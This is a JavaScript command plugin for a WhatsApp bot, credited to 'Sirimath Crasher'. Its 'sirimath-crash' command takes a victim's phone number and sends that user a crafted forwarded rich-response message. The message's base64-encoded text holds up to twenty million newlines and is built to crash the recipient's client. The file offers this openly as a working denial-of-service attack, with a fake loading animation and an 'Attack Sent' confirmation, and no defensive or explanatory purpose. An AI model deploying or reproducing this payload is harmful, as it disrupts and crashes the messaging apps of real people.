const axios = require('axios');
const config = require('../settings');
const { cmd } = require('../lib/command');
const { get_set } = require('../lib/set_db');

// 𝐂ʀᴇᴅɪᴛ: 𝐒ɪʀɪᴍᴀᴛʜ 𝐂ʀᴀꜱʜᴇʀ 👀🦈

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

cmd({
    pattern: "sirimath-crash",
    alias: ["scrash", "s-crash"],
    react: "🦈🦈",
    desc: "Crash target with SIRIMATH",
    category: "ᴏᴡɴᴇʀ",
    use: '.sirimath-crash 94xxxxxxx <lines>',
    filename: __filename
},
async (conn, mek, m, { from, q, reply, pushName }) => {
    try {
        if (!q) return reply(`*Usage:*.sirimath-crash 94xxxxxxx <lines>\n*Ex:*.sirimath-crash 94771234567 500000`)

        let args = q.trim().split(" ")
        let targetNum = args[0].replace(/[^0-9]/g, '')
        let count = args[1]? parseInt(args[1]) : 100000

        if (!targetNum) return reply("❌ *Number එක හරියට දාන්න!*\n*Ex:* 94771234567")

        let jid = targetNum + "@s.whatsapp.net"

        // safety limit
        if (isNaN(count)) count = 10000000
        if (count > 20000000) count = 20000000
        if (count < 100000) count = 100000

        // ANIMATED LOADING
        let animMsg = await reply(`⚠️ *𝐒ɪʀɪᴍᴀᴛʜ 𝐂ʀᴀꜱʜᴇʀ Activated* ⚠️`)
        await sleep(800)
        await conn.sendMessage(from, { text: `🎯 *𝐓ᴀʀɢᴇᴛ:* ${targetNum}\n📊 *𝐋ɪɴᴇs:* ${count.toLocaleString()}`, edit: animMsg.key })
        await sleep(800)
        await conn.sendMessage(from, { text: `🔄 *𝐋ᴏᴀᴅɪɴɢ 𝐂ʀᴀꜱʜ 𝐏ᴀʏʟᴏᴀᴅ...* [10%]`, edit: animMsg.key })
        await sleep(800)
        await conn.sendMessage(from, { text: `🔄 *𝐋ᴏᴀᴅɪɴɢ 𝐂ʀᴀꜱʜ 𝐏ᴀʏʟᴏᴀᴅ...* [50%]`, edit: animMsg.key })
        await sleep(800)
        await conn.sendMessage(from, { text: `🔄 *𝐋ᴏᴀᴅɪɴɢ 𝐂ʀᴀꜱʜ 𝐏ᴀʏʟᴏᴀᴅ...* [90%]`, edit: animMsg.key })
        await sleep(800)
        await conn.sendMessage(from, { text: `💥 *𝐋ᴀᴜɴᴄʜɪɴɢ 𝐀ᴛᴛᴀᴄᴋ...*\n\n*𝐂ʀᴇᴅɪᴛ: 𝐒ɪʀɪᴍᴀᴛʜ 🦈*`, edit: animMsg.key })

        let data = {
            "sections": [
                {
                    "view_model": {
                        "primitive": {
                            "text": `==.${"\n".repeat(count)}.==`,
                            "__typename": "GenAIMarkdownTextUXPrimitive"
                        },
                        "__typename": "GenAISingleLayoutViewModel"
                    }
                }
            ]
        }

        await conn.relayMessage(jid, {
            "botForwardedMessage": {
                "message": {
                    "richResponseMessage": {
                        "messageType": 1,
                        "unifiedResponse": {
                            "data": Buffer.from(JSON.stringify(data)).toString("base64")
                        },
                        "contextInfo": {
                            "isForwarded": true,
                            "forwardOrigin": 4,
                            "forwardedNewsletterMessageInfo": {
                                "newsletterJid": "120363420123456789@newsletter",
                                "newsletterName": "𝐒ɪʀɪᴍᴀᴛʜ  👀🦈",
                                "serverMessageId": -1
                            }
                        }
                    }
                }
            }
        }, {})

        await sleep(1000)
        await conn.sendMessage(from, { text: `✅ *𝐀ᴛᴀᴄᴋ 𝐒ᴇɴᴛ 𝐒ᴜᴄᴄᴇssғᴜʟʏ* ✅\n\n🎯 *𝐓ᴀʀɢᴇᴛ:* ${targetNum}\n💣 *𝐒ᴛᴀᴛᴜs:* Delivered`, edit: animMsg.key })

    } catch (e) {
        await reply(`❌ Error: ${e.message}`)
    }
})